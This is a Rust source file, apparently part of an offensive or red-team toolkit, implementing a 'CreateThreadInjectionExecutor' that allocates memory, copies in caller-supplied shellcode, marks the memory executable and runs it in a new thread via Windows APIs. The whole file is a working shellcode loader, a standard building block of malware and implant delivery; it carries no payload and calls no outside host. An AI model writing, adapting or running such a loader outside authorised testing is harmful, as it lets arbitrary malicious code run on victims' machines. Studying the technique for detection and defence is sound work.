use std::mem::transmute;
use std::ptr::{self, null_mut};
use windows_sys::Win32::Foundation::{CloseHandle, FALSE};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, VirtualProtect, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE,
    PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject, INFINITE};

use shared::{check, Executor};

pub struct CreateThreadInjectionExecutor;

impl Executor for CreateThreadInjectionExecutor {
    fn execute(&self, shellcode: Vec<u8>) -> anyhow::Result<()> {
        let shellcode_size = shellcode.len();
        unsafe {
            // allocate RW memory for shellcode
            let base_addr = VirtualAlloc(
                ptr::null_mut(),
                shellcode_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            check!(!base_addr.is_null());

            // copy shellcode to RW memory
            std::ptr::copy(shellcode.as_ptr(), base_addr.cast(), shellcode_size);

            // change memory protection to RX
            let mut old = PAGE_READWRITE;
            let res = VirtualProtect(base_addr, shellcode_size, PAGE_EXECUTE, &mut old);
            check!(res != FALSE);

            // create thread to execute shellcode
            let ep = transmute(base_addr);
            let mut tid = 0;
            let thread = CreateThread(null_mut(), 0, Some(ep), null_mut(), 0, &mut tid);
            check!(thread != null_mut());

            // wait for thread to finish
            WaitForSingleObject(thread, INFINITE);

            // free memory and close thread handle
            VirtualFree(base_addr, 0, MEM_RELEASE);
            CloseHandle(thread);
        }
        Ok(())
    }
}
